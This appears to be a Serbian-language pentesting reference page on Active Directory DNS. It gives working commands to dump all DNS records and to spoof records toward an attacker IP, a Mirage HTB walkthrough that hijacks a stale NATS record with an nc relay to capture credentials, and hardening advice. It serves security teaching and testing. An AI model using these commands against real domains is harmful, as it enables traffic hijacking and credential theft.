# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Podrazumevano, **svaki korisnik** u Active Directory-ju može da **izlista sve DNS zapise** u DNS zonama domena ili šume, slično prenosu zone (korisnici mogu da izlistaju podređene objekte DNS zone u AD okruženju).

Alat [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) omogućava **enumeraciju** i **izvoz** **svih DNS zapisa** u zoni u svrhu izviđanja internih mreža.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) dodaje JSON/Greppable (`--json`) izlaz, višestruko-nitnu DNS rezoluciju i podršku za TLS 1.2/1.3 pri povezivanju na LDAPS

Za više informacija pročitajte [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kreiranje / izmena zapisa (ADIDNS spoofing)

Pošto grupa **Authenticated Users** podrazumevano ima **Create Child** dozvolu na DACL-u zone, bilo koji domain account (ili computer account) može da registruje dodatne zapise. Ovo se može koristiti za otmicu saobraćaja, NTLM relay coercion ili čak potpunu kompromitaciju domena.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py isporučuje se uz Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Uobičajene osnove napada

1. **Wildcard record** – `*.<zone>` pretvara AD DNS server u responder za čitavo preduzeće, sličan LLMNR/NBNS spoofing-u. Može se zloupotrebiti za hvatanje NTLM hash-eva ili njihovo relay prosleđivanje ka LDAP/SMB-u.  (Zahteva da WINS-lookup bude onemogućen.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – dodajte `wpad` (ili **NS** record koji pokazuje na host napadača kako biste zaobišli Global-Query-Block-List) i transparentno prosleđujte odlazne HTTP zahteve kroz proxy radi prikupljanja kredencijala. Microsoft je zakrpao wildcard/ DNAME bypass-e (CVE-2018-8320), ali **NS-records i dalje rade**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – preuzmite IP adresu koja je prethodno pripadala workstations računaru, pa će povezani DNS entry i dalje biti razrešavan, što omogućava resource-based constrained delegation ili Shadow-Credentials napade bez ikakvog menjanja DNS-a.
4. **DHCP → DNS spoofing** – u podrazumevanoj Windows DHCP+DNS deployment konfiguraciji, neautentifikovani napadač na istom subnetu može da prepiše bilo koji postojeći A record (uključujući Domain Controllers) slanjem falsifikovanih DHCP zahteva koji pokreću dinamičke DNS update-e (Akamai „DDSpoof“, 2023).  Ovo omogućava machine-in-the-middle napad nad Kerberos/LDAP-om i može dovesti do potpunog preuzimanja domena.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – promenite `dNSHostName` machine account-a koji kontrolišete, registrujte odgovarajući A record, a zatim zatražite certificate za to ime kako biste se impersonirali kao DC. Alati kao što su **Certipy** ili **BloodyAD** u potpunosti automatizuju ovaj tok.

---

### Hijacking internih servisa putem zastarelih dinamičkih record-a (NATS case study)

Kada su dynamic update-i otvoreni za sve autentifikovane korisnike, **deregistrovano ime servisa može ponovo da se preuzme i usmeri na infrastrukturu napadača**. Mirage HTB DC je nakon DNS scavenging-a izložio hostname `nats-svc.mirage.htb`, pa je svaki korisnik sa niskim privilegijama mogao da:<sup>[[3]](#references)</sup>

1. **Potvrdi da record nedostaje** i sazna SOA pomoću `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Ponovo kreirajte zapis** ka eksternom/VPN interfejsu koji kontrolišu:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Oponašajte servis u plaintext-u**. NATS klijenti očekuju da vide jedan `INFO { ... }` baner pre nego što pošalju kredencijale, pa je kopiranje legitimnog banera sa pravog brokera dovoljno za prikupljanje tajni:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Svaki klijent koji razreši oteto ime odmah će leak-ovati svoj JSON `CONNECT` frame (uključujući `"user"`/`"pass"`) listener-u. Pokretanje zvaničnog `nats-server -V` binary-ja na attacker hostu, isključivanje redaction-a logova ili jednostavno sniffing sesije pomoću Wireshark-a daje iste plaintext credentials, jer je TLS bio opcionalan.

4. **Pivot sa prikupljenim credentials** – u Mirage-u je ukradeni NATS account omogućio JetStream access, koji je otkrio istorijske authentication events koji su sadržali ponovo upotrebljiva AD usernames/passwords.

Ovaj pattern se primenjuje na svaki AD-integrisani service koji se oslanja na nezaštićene TCP handshakes (HTTP APIs, RPC, MQTT itd.): kada se DNS record otme, attacker postaje service.

---

## Detekcija i hardening

* Uskratite **Authenticated Users** pravo *Create all child objects* na osetljivim zonama i delegirajte dynamic updates dedicated account-u koji koristi DHCP.
* Ako su dynamic updates neophodni, podesite zonu na **Secure-only** i omogućite **Name Protection** u DHCP-u, tako da samo owner computer object može da overwrite-uje sopstveni record.
* Nadgledajte DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) i LDAP writes ka `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokirajte opasna imena (`wpad`, `isatap`, `*`) pomoću namerno benignog record-a ili preko **Global Query Block List**.
* Održavajte DNS servers patched – npr. RCE bugs CVE-2024-26224 i CVE-2024-26231 dostigli su **CVSS 9.8** i mogu se remote exploit-ovati protiv Domain Controllers.

## Reference

- [1] [ADIDNS Revisited - WPAD, GQBL, i još mnogo toga](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, i dalje de-facto reference za wildcard/WPAD attacks)
- [2] [Spoofing DNS Records zloupotrebom DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (decembar 2023)
- [3] [HackTheBox Mirage: Lančano iskorišćavanje NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets i Kerberoasting-a](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: Dumping Active Directory DNS-a pomoću adidnsdump-a](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
